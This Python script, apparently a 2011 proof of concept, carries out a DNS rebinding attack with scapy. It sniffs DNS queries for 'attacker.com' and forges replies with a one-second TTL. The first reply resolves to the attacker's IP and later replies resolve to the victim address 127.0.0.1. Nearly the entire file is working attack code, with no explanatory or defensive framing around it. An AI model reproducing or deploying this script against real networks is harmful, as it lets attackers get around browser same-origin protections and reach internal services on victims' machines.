#! /usr/bin/env python
'''
Created on Dec 9, 2011

@author: Tobias Endres, Frieder Paape
'''

import threading, socket
from scapy.all import sniff, send, IP, UDP, DNS, DNSRR, UDPerror

attacker = "attacker.com"
attacker_ip = "192.168.1.1"
victim = "127.0.0.1"
dns_ttl = 1

global first_request
global dns_id

def dns_callback(pkt):
    if DNS in pkt and not UDPerror in pkt:
        
        global first_request
        global dns_id
        
        ip=pkt.getlayer(IP)
        dns=pkt.getlayer(DNS)
        
        if dns.qr:
            return dns.summary()
        else:
            if dns.qd != None and attacker in dns.qd.qname:
                
                if dns_id != dns.id:
                    
                    dns_id = dns.id
                    ip_answer = attacker_ip if first_request else victim
                    if first_request:
                        first_request = False
                    
                    answer = IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qr=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, ttl=dns_ttl, rdata=ip_answer))
                    send(answer,loop=0)
                    return dns.summary()

class ListenThread ( threading.Thread ):
    
    __stopped = False
        
    def stop(self):
        self.__stopped=True

    def run ( self ):
    
        # auf port 53 hoeren, sodass wir via sniff auch anfragen von auserhalb mitbekommen
        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udps.bind(('',53))
        udps.settimeout(1)
        
        while self.__stopped==False:
            try:
                udps.recv(1024)
            except socket.error:
                continue

        udps.close()

if __name__ == '__main__':
    
    first_request = True
    dns_id = -1

    lt = ListenThread()
    lt.deamon = True
    lt.start()
    
    sniff( filter="udp port 53", prn = dns_callback,  store=0)
        
    lt.stop()






